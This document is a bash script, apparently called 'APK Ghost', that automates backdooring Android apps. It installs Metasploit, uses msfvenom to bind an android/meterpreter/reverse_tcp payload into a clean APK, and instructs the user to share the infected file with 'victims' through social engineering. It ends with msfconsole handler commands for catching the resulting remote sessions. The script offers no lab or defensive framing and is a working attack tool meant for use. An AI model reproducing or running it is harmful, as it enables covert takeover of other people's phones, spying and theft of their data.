#!/bin/bash
# Inject Payload in Android APK
# Created By R KUNDU & D Mahapatra
clear
cat <<EOF
            _____   _  __   _____  _                  _   
     /\    |  __ \ | |/ /  / ____|| |                | |  
    /  \   | |__) || ' /  | |  __ | |__    ___   ___ | |_ 
   / /\ \  |  ___/ |  <   | | |_ || '_ \  / _ \ / __|| __|
  / ____ \ | |     | . \  | |__| || | | || (_) |\__ \| |_ 
 /_/    \_\|_|     |_|\_\  \_____||_| |_| \___/ |___/ \__|
                                                          Version : 1.0
                                                          Create By : Rajat Kundu
                                                          Designed By : Debadrita Mahapatra
                                                                                             
EOF
sleep 2
echo "--------------------------------------------------------------------------------------------------------------------"


#Checking For Root Access
echo "Checking For Root User...."
sleep 2
if [[ $(id -u) -ne 0 ]] ; then 
   echo "You are Not Root! Please Run as root" ; exit 1 ; 
else echo "Checking For Requirement Packages.." ; 
fi


#Checking and Installing Required Packages
pkgs=(metasploit-framework apktool default-jdk aapt apksigner apache2)
for pkg in ${pkgs[@]}
do
 sudo apt install $pkg
done
sleep 2
clear
echo "Required Packages Has Been Installed Sucessfully"

clear
cat <<EOF
   ------    -----------  ----    ----           ------------ ----    ----   --------   ------------ ------------ 
  ********   ************ ****   ****            ************ ****    ****  **********  ************ ************ 
 ----------  ---      --- ----  ----             ----         ----    ---- ----    ---- ----         ------------ 
****    **** ************ *********              ****  ****** ************ ***      *** ************     ****     
------------ -----------  ---------              ----  ------ ------------ ---      --- ------------     ----     
************ ****         ****  ****             ****    **** ****    **** ****    ****        *****     ****     
----    ---- ----         ----   ----            ------------ ----    ----  ----------  ------------     ----     
****    **** ****         ****    ****           ************ ****    ****   ********   ************     ****     
                                                                                                 Version : 1.0
                                                                                            Create By : Rajat Kundu
                                                                                         Designed By : Debadrita Mahapatra 
EOF

echo "------------------------------------------------------------------------------------------------------------------------------------------------------"

#Setting Up Variables For Injecting
read -p "Set Your LHOST: " lhost1
read -p "Set Your LPORT: " lport1
echo  "APK Files You Have :" *.apk
read -p "Write Clean APK Name: " capk
read -p "Write the Name For Bind APK: " bapk

clear
cat <<EOF
 _______  _______  _            _______           _______  _______ _________
(  ___  )(  ____ )| \    /\    (  ____ \|\     /|(  ___  )(  ____/ \__   __/
| (   ) || (    )||  \  / /    | (    \/| )   ( || (   ) || (         ) (   
| (___) || (____)||  (_/ /     | |      | (___) || |   | || (_____    | |   
|  ___  ||  _____)|   _ (      | | ____ |  ___  || |   | |(_____  )   | |   
| (   ) || (      |  ( \ \     | | \_  )| (   ) || |   | |      ) |   | |   
| )   ( || )      |  /  \ \    | (___) || )   ( || (___) |/\____) |   | |   
|/     \||/       |_/    \/    (_______)|/     \|(_______)\_______)   )_(  Version : 1.0
                                                                          Create By : Rajat Kundu
                                                                        Designed By : Debadrita Mahapatra  
EOF

echo "-----------------------------------------------------------------------------------------------------------------------------------"             
                                                            
#Injecting Payload Into APK
echo "Injecting Payload into Your APK"
msfvenom -x $capk -p android/meterpreter/reverse_tcp lhost=$lhost1 lport=$lport1 -o $bapk

echo "--------------------------------------------------------------------------------------------------------------------"
echo "Injecting payload Complete Into : $capk "
echo "                  "
echo "New infected payload save as : $bapk "
echo "                   "
echo "Infected payload save in this location : " ; pwd
echo "                     "
echo "**Step1: Share this infected apk file to victims android device using Social Engineering ...!!!.."
echo "**Step2: Download anyway & Run this app on victim android device...!!.........!..... "
echo "--------------------------------------------------------------------------------------------------------------------"
echo "                   "
echo "                   "
echo "After complete Step2 Run a Listener Using msfconsole .      "
echo " All Command Are Given Below.....!                  "
echo "                   "
echo "--------------------------------------------------------------------------------------------------------------------"
echo "--------------------------------------------------------------------------------------------------------------------"
echo " To Start Msfconsole Type                      >               msfconsole "
echo " To Star A Handler Type                        >               use exploit/multi/handler "
echo " To Specify Payload Variant Type               >               set payload android/meterpreter/reverse_tcp "
echo " To Set Local Host Type                        >               set LHOST <your_local_host> "           
echo " To Set Local Port Type                        >               set LPORT <port_number> "
echo " To Avoid Discontinuous Connection Type        >               set ExitOnSession false "
echo " To Run Listener Type                          >               exploit -j "
echo " To See Active Sessions List Type              >               sessions -i "
echo " To Start Sessions Listening Type              >               sessions -i <session_number> "
echo " To Get Others Help Type                       >               help "
echo "                   "
echo "--------------------------------------------------------------------------------------------------------------------"
echo "--------------------------------------------------------------------------------------------------------------------"
echo "************************************************  BYE BYE  *********************************************************"

